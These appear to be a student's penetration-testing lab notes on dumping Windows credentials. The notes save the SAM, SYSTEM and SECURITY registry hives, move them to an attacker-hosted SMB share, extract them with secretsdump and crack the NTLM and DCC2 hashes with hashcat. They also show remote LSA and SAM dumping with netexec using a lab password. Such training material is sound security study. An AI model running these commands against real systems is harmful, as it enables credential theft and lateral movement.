
With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline.

## Registry hives
There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes.

|Registry Hive|Description|
|---|---|
|`HKLM\SAM`|Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.|
|`HKLM\SYSTEM`|Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.|
|`HKLM\SECURITY`|Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.|
We can back up these hives using the `reg.exe` utility.

#### Using reg.exe to copy registry hives

Launch  `cmd.exe` with administrative privileges
```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save 
The operation completed successfully. 

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save 
The operation completed successfully. 

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save 
The operation completed successfully.
```
![[Pasted image 20260407005253.png]]

If we're only interested in dumping the hashes of local users, we need only `HKLM\SAM` and `HKLM\SYSTEM`

However, it's often useful to save `HKLM\SECURITY` as well, since it can contain cached domain user credentials on domain-joined systems, along with other valuable data.

#### Lets pass the hashes from windows to attack machine

```shell
# Kali machine

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```
![[Pasted image 20260407010147.png]]


```shell
# Windows machine

C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```
![[Pasted image 20260407010633.png]]

#### Dumping hashes with secretsdump

```shell
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
![[Pasted image 20260407010742.png]]

Here we see that `secretsdump` successfully dumped the `local` SAM hashes, along with data from `hklm\security`, including cached domain logon information and LSA secrets such as the machine and user keys for DPAPI.

Notice that the first step `secretsdump` performs is retrieving the `system bootkey` before proceeding to dump the `local SAM hashes`. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted — which is why having copies of the relevant registry hives, as discussed earlier, is crucial.

> Dumping local SAM hashes (uid:rid:lmhash:nthash)

This tells us how to interpret the output and which hashes we can attempt to crack.

Morder windows -> NT hashes
Old -> LM Hashes (Weaker)

we can copy the NT hashes associated with each user account into a text file and begin cracking passwords.
![[Pasted image 20260407011425.png]]

```shell
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

# -m 1000 corresponds to ntlm hash
```
![[Pasted image 20260407011348.png]]

we could attempt to use the cracked credentials to access other systems on the network.


Keep in mind that this is a well-known technique, and administrators may have implemented safeguards to detect or prevent it. Several detection and mitigation strategies are [documented](https://attack.mitre.org/techniques/T1003/002/) within the MITRE ATT&CK framework.

---

## DCC2 hashes

`hklm\security` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

- difficult to crack (800 times slower then ntlm)
- it uses PBKDF2
- cannot be used for lateral movement with techniques like Pass-the-Hash
- Hashcat mode for cracking DCC2 hashes is 2100

```shell
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

---
## DPAPI

Machine and user keys for DPAPI were also dumped from hklm\security. 

The Data Protection Application Programming Interface, or DPAPI, is a set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis. These blobs are utilized by various Windows OS features and third-party applications. 

Below are just a few examples of applications that use DPAPI and how they use it:

|Applications|Use of DPAPI|
|---|---|
|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
|`Outlook`|Passwords for email accounts.|
|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).

Directly on windows
![[Pasted image 20260407012512.png]]

---
## Remote dumping & LSA secrets considerations

Here instead of manually downloading we will download the sam security and system remotely.

With access to credentials that have `local administrator privileges`, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.

LSA manages local security policies, handles user logins, and verifies passwords. 
To do its job efficiently, LSA stores sensitive data in the registry (under `HKLM\SECURITY`).

#### Dumping LSA secrets remotely
Download the LSA seperately from the windows
```powershell
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

# use smb protocol
# 10.129.42.198 - target windows ip
# --local-auth do not got to domain controller
# --lsa dump LSA secrets
```
![[Pasted image 20260407014314.png]]

#### Dumping SAM Remotely
Download the sam remotely from the windows
```powershell
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

# use smb protocol
# 10.129.42.198 - target windows ip
# --local-auth do not got to domain controller
# --sam dump SAM 
```

